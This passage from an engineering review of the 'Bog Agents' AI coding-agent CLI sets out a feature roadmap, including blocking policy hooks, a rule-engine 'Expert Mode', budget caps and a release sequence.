**What:** Upgrade `hooks.py` so hook commands return JSON `{"action": "deny"|"allow"|"modify", "reason": ..., "replacement_input": ...}` and **block** the tool call until the hook resolves. Add the missing event names verbatim: `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `StopFailure`, `SessionStart`, `SessionEnd`, `Notification`, `PreCompact`, `SubagentStop`.
**Why:** Bog Agents' fire-and-forget design (5s timeout, stdout/stderr → DEVNULL) means hooks **can't gate or rewrite**. This is the single biggest enterprise/safety gap vs. Claude Code. Adopters cannot build org-policy gates.
**Effort:** M. **Impact:** Critical.
**Where:** `libs/cli/bog_agents_cli/hooks.py:170` (return-value plumbing), `agent.py` (await before tool dispatch), `tool_display.py` (deny UX).

#### T-3. `/telephone` upgrades — template registry + diff preview **(user-requested)**
**What:** `/telephone` exists today (verified at `libs/cli/bog_agents_cli/commands/general.py:31` with runtime in `telephone.py`). Promote it from a one-shot rewrite to a full prompt-enhancer flow: (a) selectable system-prompt templates loaded from `~/.bog-agents/telephone-templates/*.md` (engineering, research, refactor, security, write-tests, prod-prompt) with built-in defaults shipping in `built_in_skills/telephone-templates/`, (b) side-by-side draft vs. rewrite diff in `widgets/telephone.py`, (c) `Apply` / `Edit further` / `Cancel` actions.
**Why:** User-mandated. Existing command is functional but template + diff turn it into a stand-out feature no competitor matches.
**Effort:** S. **Impact:** High.
**Where:** `libs/cli/bog_agents_cli/telephone.py`, `widgets/telephone.py`, new `built_in_skills/telephone-templates/`.

#### T-4. Hierarchical AGENTS.md + CLAUDE.md memory cascade
**What:** Walk from cwd up to repo root, accumulating `AGENTS.md`, `CLAUDE.md`, and `.bog-agents.md`; merge by directory depth (root rules apply broadly, subdir rules apply locally). Adopt the open AGENTS.md standard for portability.
**Why:** Claude Code, Cursor, Windsurf, Aider, Zed, Warp, and Roo Code all read `AGENTS.md` as of late 2025. Today `project_memory.py` reads `.bog-agents.md` flat and skips `AGENTS.md` entirely. Portability is now expected.
**Effort:** S–M. **Impact:** High.
**Where:** `libs/cli/bog_agents_cli/project_memory.py` (walk parents, glob subdirs); add AGENTS.md scanner.

#### T-5. Predictive Tab autocomplete in the CLI input
**What:** Ghosted next-prompt suggestions in `widgets/chat_input.py` driven by (a) recent file edits, (b) failed tool calls (retry hint), (c) common follow-ups ("run tests?", "commit?"). Cursor-style "magic" feel.
**Why:** Highest user-perceived "magic" in modern editors; adds nothing in raw capability but enormous in feel. Cursor and Windsurf Cascade both ship this.
**Effort:** M. **Impact:** High.
**Where:** `widgets/chat_input.py`, new `predictive_input.py`; signal sources from `cost_tracker.py` + `file_watcher.py`.

#### T-6. Aider-style watch mode (AI-comment trigger)
**What:** `bog-agents --watch` watches the repo. When a `# ai:` or `// ai:` comment is saved in any file, that comment becomes the prompt and the file is auto-attached. Works inside any editor (VS Code, JetBrains, Vim, Emacs) without an extension.
**Why:** Bog Agents has `file_watcher.py` already — this is the missing UX. Lets non-CLI-fans use the agent from anywhere.
**Effort:** S–M. **Impact:** High.
**Where:** `libs/cli/bog_agents_cli/file_watcher.py` (comment detection), `non_interactive.py` (single-shot dispatch), new `cmd_watch.py`.

#### T-7. `@docs` channel (pre-indexed framework docs)
**What:** `@docs:react`, `@docs:django` etc. Users register docs sources (URL or git repo); bog-agents indexes them and injects relevant chunks. Cursor's `@docs` is a primary draw.
**Why:** Bog Agents has `@url` (one-shot fetch) but no indexed corpus. Combined with `dreamscape`, becomes a long-lived knowledge channel.
**Effort:** M–L. **Impact:** High.
**Where:** `widgets/autocomplete.py:798` (new mention type), new `docs_index.py`, leverage existing `hybrid_search.py` + `opensearch_rag.py`.

#### T-8. Orchestrator-as-mode (Roo Code "Boomerang Tasks" parity)
**What:** First-class `/orchestrate` flow — user states a goal, orchestrator decomposes into subtasks, each subtask launches in its own subagent with a specialized mode (code, test, review, doc), results "boomerang" back. UI shows the tree with progress.
**Why:** Bog Agents has every piece (`agent_teams.py`, `parallel_agents.py`, `team_orchestration.py`, `multi_agent_orchestrator.py`, `/squad`, `/race`) but no packaged UX. This is the killer demo for "agents that ship features."
**Effort:** M. **Impact:** Critical.
**Where:** New `/orchestrate` in `commands/general.py`; runner stitched from existing middlewares; new `widgets/orchestrator_panel.py`.

#### T-9. Cost budget caps + per-task spend ceilings
**What:** `/budget set 5usd` per session, `/budget daily 20usd` global. When `cost_tracker.py` crosses 80%, warn; at 100%, fire the new `Stop` hook (T-2) to escalate.
**Why:** Enterprise blocker. Cline shows real-time cost but no caps; Cursor charges credits with no per-task ceiling. **Genuinely unsolved across the field.**
**Effort:** S. **Impact:** High.
**Where:** `middleware/cost_tracker.py`, `commands/config.py` (new `/budget`), wire into T-2 Stop hook.

#### T-10. MCP Marketplace UI (Cline-parity, polished)
**What:** Curated, signed registry of MCP servers; one-click install; OAuth flow handling (already in `oauth_mcp.py`); "ask the agent to add a tool" intent that auto-creates+installs.
**Why:** Lowering MCP adoption friction is the #1 user feedback for every agentic tool right now.
**Effort:** M. **Impact:** High.
**Where:** `plugin_marketplace.py`, `mcp_registry.py`, `mcp_trust.py`, new `widgets/marketplace_screen.py`.

#### T-11. `/expert` — neuro-symbolic Expert Mode (forward + backward chaining rule engine) **(user-requested deep-dive)**

**The opportunity in one line:** Pair the LLM (good at ambiguity, generation, interpretation) with a real production rule system (good at constraints, determinism, audit, dispatch). No coding-agent competitor does this. Bog Agents is uniquely positioned because the substrate is already half-built.

**What's actually there today (the substrate):**
- `libs/bog-agents/bog_agents/middleware/rules.py` (511 LOC) — but this is **markdown-frontmatter prompt injection**, not a rule engine. `RuleSpec` matches file globs and injects markdown text into the system prompt. `apply_rules()` does a linear filter, not a join. There's no working memory, no chaining, no conflict resolution, no inference.
- `approval_gates.py` (`ApprovalStore`, `ApprovalGate`) — natural sink for `require_approval` actions.
- `smart_approvals.py`, `safe_tools.py`, `dlp.py` — three more proto-rule-systems with hardcoded predicates.
- `automations.py`, `scheduled_runs.py` — trigger/condition/action shape already; today there's no shared engine.
- `/rules` slash command at `libs/cli/bog_agents_cli/commands/general.py:183` — currently manages the prose rules; can grow to manage the real rules.

The aspiration is there. The engine isn't.

**What "Expert Mode" actually means:**

A small production rule system (Rete-style pattern matching against a working memory of typed facts) that runs **alongside** the LLM agent, not in place of it. The LLM proposes; the rule engine constrains, routes, denies, escalates, or explains. Toggle via `/expert on` (loads rulebooks + starts the engine) or `/mode expert` (full-takeover mode where the LLM only fires when no rule fires).

**Forward chaining** ("data-driven") = facts asserted into working memory → rules whose conditions match fire → actions execute and may assert new facts → new rules fire → quiescence. Use case: every tool call, file edit, model token-count, and config change is asserted as a fact; rules react.

**Backward chaining** ("goal-driven") = user (or LLM) poses a goal; engine walks backward, asking "what rules' consequents could produce this goal? what facts would prove their antecedents?" Use case: `/why deny_force_push` walks back from the action to the conditions; `/prove can_deploy_to_prod` walks back from the goal to the unmet prerequisites.

**Where it adds value in bog-agents specifically (six concrete wins):**

1. **Policy enforcement that actually composes.** Today `safe_tools.py` hardcodes denylist patterns; `dlp.py` hardcodes redaction; `approval_gates.py` hardcodes thresholds. With a rule engine an admin writes one rulebook:
   ```yaml
   - name: prod_force_push_gate
     when:
       - tool_call: { name: shell_execute, command: { matches: "git push.*--force.*(main|master)" } }
       - context: { env: { in: [prod, production] } }
     then:
       - deny: "Force-push to {{branch}} on {{env}} is prohibited"
       - notify: { channel: slack, severity: high }
       - audit_log
   ```
   One declarative file replaces five different middleware patches. (Pairs perfectly with T-2 blocking hooks — rules return the same action vocabulary.)

2. **Plan-mode reasoning with provable constraints.** When `PlanModeMiddleware` proposes a plan, forward-chain the plan steps against the rulebook. A plan that includes "drop table" triggers `requires_backup_step` and the engine inserts the missing step or rejects the plan with an explanation the LLM can act on. Backward chain: "to achieve goal X, what must be true?" → engine produces the dependency tree the LLM uses as a planning skeleton.

3. **Skill activation richer than pattern match.** `skills.py` activates skills by glob/keyword. With a rule engine: *"if language=Python AND last_tool_call=pytest AND last_exit_code != 0 THEN activate `pytest-debug` skill AND set urgency=high"*. Skill activation becomes composable and explainable.

4. **Multi-agent routing without prompt spaghetti.** `multi_agent_orchestrator.py` today hands routing to the LLM via prompt. Move routing to rules: *"if task.text contains 'migration' AND repo has `alembic/` THEN route to db-specialist"*. Faster, cheaper, deterministic, auditable. The LLM stays for the cases rules don't cover.

5. **Cost/budget gates that survive across sessions.** Pair with T-9. Forward-chain: every tool call asserts a `cost` fact → engine maintains running totals → at 80% the `approaching_budget_limit` rule fires a soft warning → at 100% the `over_budget` rule fires a hard `Stop`. State survives the session because facts live in `~/.bog-agents/expert-memory/`.

6. **Regulated-domain "doctor" mode.** Forward-chain over test results, build output, deploy logs: *"if test_failed AND error contains 'ConnectionRefused' AND service_x was deployed in last 30min THEN propose root_cause='service_x rollback'"*. Diagnostics that don't depend on LLM mood. This is also the bridge to making the FA vertical middleware real — compliance is literally how rule-based systems were built in finance for 40 years (FINRA Rule 3110 in `audit_trail.py:21-30` is already pointing at this).

**Engine choice — what NOT to build:**

- ❌ **CLIPS via `clipspy`** — C dependency, Windows pain, Lisp-y syntax, niche audience. The bog-agents users you want are Python devs, not 1990s expert-system engineers.
- ❌ **`experta`** — most mature Python option but actively unmaintained since 2019 and uses metaclass magic that fights modern tooling.
- ❌ **A full Rete network from scratch** — 1000s of LOC; only pays off above ~10k rules. You won't have 10k rules.
- ❌ **Datalog (`pyDatalog`)** — declarative joins but recursion-only model fights the imperative "fire an action" use case.

**What to build instead:**

A 600–1000 LOC custom engine in `libs/bog-agents/bog_agents/middleware/expert_engine/`:
- **Working memory** = a typed fact store (Python dataclasses), keyed by `(fact_type, id)` for retraction. Persisted to `~/.bog-agents/expert-memory/{session}.jsonl` for replay.
- **Rule = `Rule(name, when: list[Pattern], then: list[Action], salience: int, once: bool)`**. Loaded from `*.yaml` files alongside `.bog-agents.md`. Hot-reload via existing `file_watcher.py`.
- **Pattern matching** = simple linear scan with predicate functions. Add a hash index keyed on `fact_type` and you handle thousands of facts × hundreds of rules in microseconds. Rete is the next optimization step, not the starting point.
- **Conflict resolution** = `salience` (priority) + `recency` + `once` flag. Document it. Predictability beats cleverness here.
- **Action vocabulary** matches T-2 hooks exactly: `deny`, `modify`, `require_approval`, `route_to_subagent`, `notify`, `audit_log`, `assert_fact`, `retract_fact`, `ask_llm` (escape hatch: let the model decide the messy case).
- **Backward chainer** = AND/OR proof tree walker over rule consequents. Each query returns a `Trace` (which rules fired, which facts justified them) that drives the `/why` and `/trace` UX.

**The killer insight nobody else can pull off — LLM writes the rules.**

The hardest part of any expert system since 1985 is rule authoring. Domain experts don't write CLIPS; engineers write CLIPS badly. **In 2026 you don't need either.** Workflow:

1. User: *"I never want the agent to push to main without a passing CI run."*
2. Agent: *"I'll write this as a rule. Here's the YAML it would produce. Activate?"* (renders the rule + the facts it would have changed in the last 10 sessions if it had been active — replay against `expert-memory/`)
3. User: *"Yes."* → rule saved, activates immediately.

This is the bridge between LLM ergonomics and rule-based determinism. **No competitor has this loop.** Cursor/Cline/Aider/Claude Code all keep the agent stochastic top-to-bottom. Bog Agents would be the first coding agent with *constructive learning* — the LLM proposes rules, the user approves, the system gets a little more deterministic with every session. Pair with **dreamscape**: nightly dreams suggest new rules based on yesterday's patterns; user wakes up to a list of "rules I'd write if I were you."

**Slash command UX:**

| Command | What |
|---|---|
| `/expert on` / `off` | Toggle rule engine. Default off (opt-in). |
| `/expert mode soft\|hard` | Soft = rules advise, LLM decides. Hard = rules can deny/modify and the LLM works within constraints. |
| `/rules` | Existing command, extended: list active rules, view a rule, edit, disable, hot-reload. |
| `/rules add` | Conversational rule authoring (the LLM writes it from your description). |
| `/why <fact-or-action>` | Backward-chain explanation. Shows the proof tree. |
| `/trace` | Live rule-firing log for the last N turns. Toggleable side panel via existing `widgets/orchestrator_panel.py` pattern. |
| `/explain <rule-name>` | LLM-narrated description of what a rule does and what it would have done historically. |
| `/prove <goal>` | Backward-chain query: what would need to be true? |

**Risks and how to defuse them (the expert-system "tar pit"):**

| Risk | Mitigation |
|---|---|
| Rule sprawl — 200 rules become unintelligible | Hard ceiling per rulebook (e.g., 50). `/expert lint` reports conflicts, dead rules, redundant predicates. |
| Conflict resolution surprises | Deterministic priority: explicit `salience` → recency → first-loaded. Documented. `/expert trace` shows resolution path. |
| Authoring friction | LLM-writes-rules workflow above. Plus YAML, not Lisp. Plus a tiny built-in linter. |
| Performance with many facts × rules | Index by `fact_type`; benchmark gate in CI; if it ever matters, add Rete v2. Won't matter for <10k facts. |
| Users believe rules are smarter than they are | UI consistently surfaces "this is a static rule, not the model" — distinct color/icon in `widgets/messages.py`. |
| Rules contradict the model's training | LLM cannot override `deny`; can override `advise`. Hard mode = rules win; soft mode = LLM wins; this distinction is the load-bearing UX clarity. |
| Compliance-grade audit drift | All firings written to `audit_trail.py`; every action carries the rule name + version hash. |

**Effort:** L (engine: ~2 weeks; YAML grammar + loader: ~3 days; UX: ~1 week; LLM rule-author flow: ~1 week; dreamscape pairing: ~1 week). Total ≈ 4–6 weeks for v1.
**Impact:** Critical for differentiation, **High** for daily-driver users, **Critical** for any regulated-industry adopter and for the FA vertical pivot if it ever ships for real.
**Where:**
- Extend `libs/bog-agents/bog_agents/middleware/rules.py` (rename to `expert_rules.py`; keep `RulesMiddleware` as a compatibility alias).
- New `libs/bog-agents/bog_agents/middleware/expert_engine/{__init__,working_memory,pattern,rule,engine,backward,actions}.py`.
- Hook into action sinks: `approval_gates.py`, `safe_tools.py`, `dlp.py`, `audit_trail.py`, `multi_agent_orchestrator.py`.
- CLI surfaces: `libs/cli/bog_agents_cli/commands/general.py` (extend `/rules` + add `/expert`, `/why`, `/trace`, `/prove`), new `libs/cli/bog_agents_cli/widgets/rule_trace_panel.py`, new `libs/cli/bog_agents_cli/expert_authoring.py` (the LLM-writes-rules loop).
- Dreamscape integration: new `libs/cli/bog_agents_cli/dreamscape/rule_proposals.py` — nightly job that mines transcripts for candidate rules.

**Verdict.** This is the most defensible feature in the entire roadmap. Every other top-tier feature either has parity-with-someone (hooks/Claude Code, orchestrator/Roo, watch mode/Aider, @docs/Cursor) or is a UX polish. **A neuro-symbolic hybrid agent that learns its own rules is genuinely a new category** — and bog-agents is the only project with both halves of the substrate (a real middleware library AND an LLM-driven authoring workflow) to credibly ship it. Build this and you don't compete with Cursor; you reframe the conversation. Marketing-wise: *"Other agents guess every time. Bog Agents remembers what you decided."*

The single biggest risk is scope creep — Expert Mode is a product, not a feature. Ship v1 narrow: policy gates only (one rulebook, one action vocabulary, no backward chaining). Earn the right to expand by proving the constraint UX feels good.

### 5.2 M-tier — Medium-value (next 10)

| # | Feature | Effort | Notes |
|---|---|---|---|
| M-1 | `/architect` first-class command (planner+editor split, Aider parity) | S | `commands/agent.py`; runner in `multi_agent_orchestrator.py` |
| M-2 | Output styles toggle (`/style concise\|verbose\|teaching\|silent`) | S | Use `personas.py` infra; Claude Code parity |
| M-3 | Inline edit preview (Cmd+K analog) | M | Keyboard shortcut → inline edit prompt scoped to selected file; `widgets/diff.py` |
| M-4 | `/web` deep crawl (URL tree, not single page) | S | Augment `web_search.py`, `commands/web.py` |
| M-5 | `/init` → interactive AGENTS.md authoring assistant | S | Extend existing `/init` |
| M-6 | Multi-agent judging panel for code review (Cursor 2.2 parity) | S | `jury.py` + `/jury` already exist; expose as default for `/review` |
| M-7 | Smart commit attribution (auto-tag commits with model+session+cost) | S | `auto_commit.py` |
| M-8 | Per-mode tool allowlists (Roo Code's killer detail) | M | `personas.py` + `safe_tools.py` |
| M-9 | Memory bank: `/decisions` (append-only ADR-lite log readable by agent) | S | Distinct from dreamscape; use `memory.py` |
| M-10 | Image paste from clipboard (Cline parity) | S | `clipboard.py` exists; wire into `chat_input.py` + `image_cli.py` |

### 5.3 D-tier — Differentiation plays (pioneer moves no competitor has)

#### D-1. Dreamscape-driven nightly self-improvement
Run dreamscape between sessions to (1) propose new skills from yesterday's transcripts (the `skill_flywheel.py` exists — generalize it), (2) auto-tune `model_cascade` thresholds based on actual outcomes, (3) prune stale memories. No competitor has long-term test data for "what does the agent get better at over time." Uniquely yours per `docs/dreamscape-runs/`. Files: `dreamscape/dream_engine.py`, `dreamscape/lifecycle.py`, new `dreamscape/auto_skills.py`, `skill_flywheel.py`.

#### D-2. Daemon-as-shared-context across editors
The `cmd_daemon.py` daemon already exists (v0.8.7, the healthiest satellite). Expose it as a localhost service that VS Code, Zed (via ACP), JetBrains, Neovim, and the CLI all share — same session, same memory, same plan, same skills. **Cursor and Claude Code each lock you to their editor; bog-agents could be the cross-editor backbone.** Files: `cmd_daemon.py`, `daemon_client.py`, `libs/acp/`, `libs/vscode-extension/`, `serve.py`.

#### D-3. Multi-repo orchestration
`middleware/multi_repo.py` exists; no competitor handles N repos cleanly. Pioneer `/repo-fleet`: one prompt fans out across N repos, agents work in worktrees, results converge into a coordinated PR set across repos. Files: `multi_repo.py`, `worktree.py`, `pr_management.py`.

#### D-4. Composable middleware-as-plugins marketplace
102 middleware is a moat **if you surface it**. Each middleware is already a composable unit — expose them as installable "abilities" with one-line opt-in in `.bog-agents.md`. No competitor has anything close to this composability surface. Files: `plugin_system.py`, `extensibility.py`, new `marketplace/middleware/`.

#### D-5. Hallucination + citations + fact-check as a default loop
`hallucination_detection.py`, `citations.py`, `fact_check.py` all exist. Wire them into the **default** post-tool loop so every claim links back to `file:line` or URL. No competitor ships this on by default. Files: `middleware/{hallucination_detection,citations,result_synthesis}.py`.

### 5.4 U-tier — Already shipped, under-marketed (surface these)

These are features bog-agents has that competitors charge for or trumpet as flagship — yet no one would know from the welcome screen or README:

- **`/telephone`** prompt enhancer — exists; no competitor has it. Put on welcome screen.
- **Self-improving flywheel** (`/teach`, `skill_flywheel.py`) — competitors talk "memory" abstractly; bog-agents actually proposes new skills and tracks acceptance.
- **102 middleware** — the largest composable agent kit on the market; the lazy-import architecture is itself a differentiator (once P0-B is fixed).
- **Multi-agent toolbox** — `/squad`, `/race`, `/jury`, `/devil` predate Cursor 2.0's 8-parallel-agent launch with richer roles.
- **`/peat`, `/qa`** — featured in help but rarely surfaced as differentiators.
- **Dreamscape** — entirely unique long-term memory subsystem with phase-snapshot effectiveness tracking. Far and away the most defensible feature in the codebase.
- **Cross-editor surface** — ACP for Zed + VS Code extension + CLI + daemon + non-interactive mode. Cursor is Cursor-only, Claude Code is CLI-only, Cline is VS Code-only. Bog-agents already spans four surfaces; this should be on the front page.
- **MCP trust + OAuth** (`mcp_trust.py`, `oauth_mcp.py`) — Cline shipped MCP marketplace **without** a trust layer. Enterprise win.
- **Air-gapped + offline mode** (`middleware/air_gapped.py`, `offline_mode.py`) — no competitor offers a clean air-gap story. Regulated-industry differentiator.
- **Worktree + multi-repo + remote sandbox** (daytona, modal, runloop integrations) — competitors are just discovering worktrees (Cursor 2.0, Windsurf Wave 13); bog-agents shipped them with multiple sandbox backends.

---

## 6. Recommended sequencing

### Wave 0 — Pre-1.0 (~2 weeks, unglamorous, ship-blockers)

P0-A (vertical-market extraction), P0-B (lazy middleware imports), P0-C (SSRF gate), P0-D (MCP timeout), P0-E (Windows perms honesty), P0-F (CLAUDE.md update), P0-G (API-key registry merge), P0-H (encoding bombs), P0-I (worktree asyncio leak), P0-J (inline LangChain private constants), P0-K (regex demotion or removal).

**Definition of done:** A skeptical OSS user can `pipx install bog-agents-cli`, run it cold, point it at a real repo, and not find:
- Stub tools returning `$0.00`
- A 60s hang on first launch from MCP
- A "0600" file that's actually world-readable
- A docstring that lies about the code below it
- Trivially-bypassable security regex masquerading as a safeguard

### Wave 1 — 1.0 → 1.1 (~6–8 weeks, killer-feature breakout)

T-2 (blocking hooks), T-1 (/sidecar), T-3 (/telephone polish), T-4 (AGENTS.md cascade), T-9 (budget caps), T-10 (MCP marketplace UI). P1-1 through P1-10. First-run wizard. PyPI description trim. SBOM + pip-audit CI.

### Wave 2 — 1.1 → 1.3 (~6 months, the long arc)

T-5 (predictive Tab), T-6 (watch mode), T-7 (@docs), T-8 (/orchestrate), **T-11 v1 (Expert Mode — policy-gates-only slice, no backward chaining yet)**, M-1 through M-10. D-1 (dreamscape self-improvement) — wired into T-11 as the rule-proposer. D-2 (daemon-as-shared-context). Architecture cleanup: middleware tiering, subagent overlap consolidation, `FeatureConfig` nesting. App.py refactor revisit.

### Wave 3 — 1.3 → 2.0 (long arc)

D-3 (multi-repo orchestration), D-4 (middleware marketplace), D-5 (citations-by-default). **T-11 v2 (Expert Mode full — backward chaining + LLM-rule-authoring loop + dreamscape-proposed-rules)** — the category-reframing release. Whatever the dreamscape data tells you to build by then.

---

## 7. Things to tweet about (a sanity check on what's defensibly best)

If a senior engineer at a competitor reads bog-agents in May 2026, the things they should grudgingly admit are unique or best-in-class:

1. **Dreamscape long-term memory** with measured cross-phase effectiveness — nobody else even claims this.
2. **Cross-editor surface** (CLI + daemon + ACP + VS Code + non-interactive) — Cursor and Claude Code can't match the breadth.
3. **Composable middleware library** — once tiered and labeled honestly, 20 production-stable + dozens of templates is genuinely the largest such kit in OSS.
4. **Air-gapped + offline mode** — the only credible enterprise/regulated story in OSS today.
5. **CVE-keyed dependency floors + OIDC-only PyPI publishing** — a higher supply-chain hygiene bar than most peers, including some commercial competitors.
6. **Neuro-symbolic Expert Mode (T-11)** — once shipped, the first coding agent that learns its own rules. *"Other agents guess every time. Bog Agents remembers what you decided."* Category-reframing, not feature-matching.

---

## 8. Closing

The core of this codebase is real, thoughtful, and security-conscious in the right places. The perimeter — stub vertical middleware, eager imports, missing MCP timeout, Windows permission claims that don't hold, CLAUDE.md drift, ghost partner directories, a LangChain Twitter URL still in an extracted `pyproject.toml` — is what's keeping it from a credible OSS-stranger 1.0. None of these are hard fixes individually; they just have to land before the marketing copy.

Once Wave 0 is done, the killer-feature lineup (especially `/sidecar`, blocking hooks, orchestrator UX, budget caps, AGENTS.md cascade, dreamscape self-improvement) is enough surface area to outpace every competitor at once — particularly because most of the differentiation plays compound on assets nobody else has.

— Senior Principal Engineer's report, May 16, 2026
